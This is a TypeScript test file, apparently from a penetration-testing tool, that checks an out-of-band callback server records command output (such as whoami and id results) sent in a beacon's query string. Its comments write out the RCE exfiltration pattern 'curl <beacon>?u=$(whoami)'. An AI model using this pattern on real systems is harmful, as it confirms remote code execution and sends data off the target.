/**
 * OOB callback exfil capture — the "OOB whoami" PoC path.
 *
 * When an RCE payload folds command output into the callback query
 * (curl <beacon>?u=$(whoami)), the target requests <beacon>?u=root. This pins
 * that the callback server captures that query as `exfil` and that waitForHit
 * returns the record so the caller can surface the username.
 */
import { describe, it, expect } from 'vitest';
import { callbackServer } from '../lib/oob/callback-server';

describe('OOB callback exfil', () => {
  it('captures command output from the callback query and returns it via waitForHit', async () => {
    const { beaconId } = callbackServer.generateBeacon();

    // Simulate the target's curl <beacon>?u=$(whoami)&i=$(id) landing on the route.
    callbackServer.recordHit(beaconId, '127.0.0.1', '{}', { u: 'root', i: 'uid=0(root)' });

    const rec = await callbackServer.waitForHit(beaconId, 1000);
    expect(rec).not.toBeNull();
    expect(rec?.received).toBe(true);
    expect(rec?.exfil).toEqual({ u: 'root', i: 'uid=0(root)' });
  });

  it('returns null when no hit lands (bare-boolean callers still work via != null)', async () => {
    const { beaconId } = callbackServer.generateBeacon();
    const rec = await callbackServer.waitForHit(beaconId, 300);
    expect(rec).toBeNull();
    expect(rec !== null).toBe(false); // the pattern the xxe prober uses
  });

  it('a hit with no query records no exfil (plain execution ping)', async () => {
    const { beaconId } = callbackServer.generateBeacon();
    callbackServer.recordHit(beaconId, '127.0.0.1', '{}');
    const rec = await callbackServer.waitForHit(beaconId, 1000);
    expect(rec?.received).toBe(true);
    expect(rec?.exfil).toBeUndefined();
  });
});
